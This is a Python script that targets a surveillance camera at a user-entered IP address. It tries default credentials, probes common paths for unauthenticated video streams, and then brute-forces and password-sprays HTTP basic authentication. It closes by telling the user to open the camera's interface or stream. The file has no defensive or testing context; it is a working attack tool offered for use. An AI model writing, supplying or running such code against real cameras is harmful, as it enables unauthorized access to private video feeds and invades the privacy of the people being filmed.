import requests
import hashlib

def generate_common_passwords(username):
    passwords = [
        username,
        username + "123",
        username + "password",
        "admin",
        "password",
        "123456",
        "guest",
        "user",
        "root",
        "default",
        "camera",
        "cctv",
        "video",
        "security",
        "test",
        "admin123",
        "adminpassword",
        "password123",
        "12345",
        "0000",
        "qwerty",
        "1111",
        "adminpass",
        "userpass"
    ]
    # Add variations with capitalization and numbers
    for p in list(passwords):
        passwords.append(p.capitalize())
        passwords.append(p.upper())
        passwords.append(p.lower())
        for i in range(10):
            passwords.append(p + str(i))
    return list(set(passwords))  # Remove duplicates

def attempt_brute_force(ip_address, username_list, password_list, login_path="/login.cgi"):
    print(f"Attempting to brute-force {ip_address}...")
    for user in username_list:
        for password in password_list:
            print(f"Trying username: {user}, password: {password}")
            try:
                url = f"http://{ip_address}{login_path}"
                
                # For basic HTTP authentication:
                response = requests.get(url, auth=(user, password), timeout=5)
                if response.status_code == 200 and "success" in response.text.lower():
                    print(f"--- SUCCESS: Found credentials! Username: {user}, Password: {password} ---")
                    return user, password

            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
    print(r"Brute-force attempt failed. No common credentials found. ¯\_(ツ)_/¯")
    return None, None

def exploit_known_vulnerabilities(ip_address):
    print(f"Attempting to exploit known vulnerabilities on {ip_address}...")
    
    # 1. Default/Hardcoded Credentials
    default_creds = [
        ("admin", "admin"), ("admin", "12345"), ("user", "user"),
        ("root", "root"), ("supervisor", "supervisor"), ("guest", ""),
        ("", "admin"), ("admin", ""), ("service", "service")
    ]
    for user, pw in default_creds:
        print(f"Trying default credential: {user}:{pw}")
        try:
            url = f"http://{ip_address}/"
            response = requests.get(url, auth=(user, pw), timeout=5)
            if response.status_code == 200 and ("video" in response.text.lower() or "stream" in response.text.lower()):
                print(f"--- SUCCESS: Default credentials work! Username: {user}, Password: {pw} ---")
                return user, pw
        except requests.exceptions.RequestException:
            pass

    # 4. Insecure Direct Object Reference (IDOR)
    common_stream_paths = [
        "/video.cgi", "/stream.cgi", "/cam.mjpg", "/video.mjpg", 
        "/axis-cgi/mjpg/video.cgi", "/videostream.cgi", "/snapshot.cgi",
        "/cgi-bin/snapshot.cgi?stream=0", "/view/viewer_index.shtml"
    ]
    for path in common_stream_paths:
        stream_url = f"http://{ip_address}{path}"
        try:
            response = requests.get(stream_url, stream=True, timeout=5)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                if ("multipart/x-mixed-replace" in content_type or 
                    "image/jpeg" in content_type):
                    print(f"--- SUCCESS: Found potential unauthenticated stream at {stream_url} ---")
                    return None, None
        except requests.exceptions.RequestException:
            pass

    print(r"No obvious exploits found or successfully exploited. ¯\_(ツ)_/¯")
    return None, None

def password_spray(ip_address, username_list, common_passwords, login_path="/login.cgi"):
    print(f"Attempting password spraying on {ip_address} with common passwords...")
    for password in common_passwords:
        print(f"Trying password: {password}")
        for user in username_list:
            try:
                url = f"http://{ip_address}{login_path}"
                response = requests.get(url, auth=(user, password), timeout=5)
                if response.status_code == 200 and "success" in response.text.lower():
                    print(f"--- SUCCESS: Found credentials! Username: {user}, Password: {password} ---")
                    return user, password
            except requests.exceptions.RequestException:
                pass
    print(r"Password spraying attempt failed. ¯\_(ツ)_/¯")
    return None, None

if __name__ == "__main__":
    target_ip = input("Enter the IP address of the surveillance camera: ")

    potential_usernames = ["admin", "user", "guest", "root", "operator", "viewer", "security", "cam", "cctv"]
    common_passwords = generate_common_passwords("admin")

    found_username, found_password = exploit_known_vulnerabilities(target_ip)

    if not found_username and not found_password:
        print("\nExploits not successful, attempting brute-force and password spraying.")
        found_username, found_password = attempt_brute_force(target_ip, potential_usernames, common_passwords)
    
    if not found_username and not found_password:
        found_username, found_password = password_spray(target_ip, potential_usernames, common_passwords)

    if found_username or found_password:
        if found_username and found_password:
            print(f"\nAccess might be possible with Username: {found_username}, Password: {found_password}")
        else:
            print("\nAccess might be possible through an unauthenticated stream or vulnerability.")
        print("Now you can try to navigate to the camera's web interface or stream URL.")
    else:
        print("\nUnable to bypass authentication or find unauthenticated streams with the current methods.")